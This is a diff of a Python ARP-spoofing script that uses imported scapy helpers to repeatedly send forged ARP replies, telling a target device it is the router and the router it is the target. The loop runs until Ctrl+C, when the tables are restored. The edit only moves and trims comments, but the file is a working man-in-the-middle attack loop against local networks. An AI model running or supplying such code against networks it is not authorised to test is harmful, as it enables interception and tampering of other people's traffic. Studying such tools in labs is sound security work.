@@ -1,5 +1,5 @@
 #/usr/bin/env python
-from __future__ import print_function # mitigate syntax error from using end=""
+from __future__ import print_function # mitigate syntax error from using *end=""*
 import time
 import sys
 from utils.scapy_utils import spoof, get_mac, check_port_forwarding, restore
@@ -12,15 +12,11 @@ check_port_forwarding()
 try:
     sent_packets_count = 0
     while True:
-        # Tell the Target Device I am the Router.
-        spoof(target_ip,gateway_ip, get_mac)
-        # Tell the Router I am the Target Device.
-        spoof(gateway_ip,target_ip, get_mac)
+        spoof(target_ip,gateway_ip, get_mac) # Tell the Target Device I am the Router.
+        spoof(gateway_ip,target_ip, get_mac) # Tell the Router I am the Target Device.
         sent_packets_count += 2
-        # Use ,end="" for python 3
-        print("\r[+] Packets set: " + str(sent_packets_count), end=""),
+        print("\r[+] Packets set: " + str(sent_packets_count), end=""), # Use ,end="" for python 3
         sys.stdout.flush()
-        # Add a delay.
         time.sleep(2) # Can quit by pressing Ctrl+c
 except KeyboardInterrupt:
     print("\n[-] Detected CTRL+C ... Resetting ARM tables..... Please wait.\n")
